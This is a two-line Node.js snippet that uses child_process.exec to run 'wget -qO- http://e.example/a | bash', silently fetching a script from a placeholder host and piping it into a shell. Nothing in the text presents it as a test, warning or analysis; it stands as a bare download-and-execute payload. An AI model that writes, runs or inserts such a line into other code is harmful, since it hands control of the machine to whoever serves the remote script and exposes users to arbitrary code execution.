const { exec } = require("child_process");
exec("wget -qO- http://e.example/a | bash");
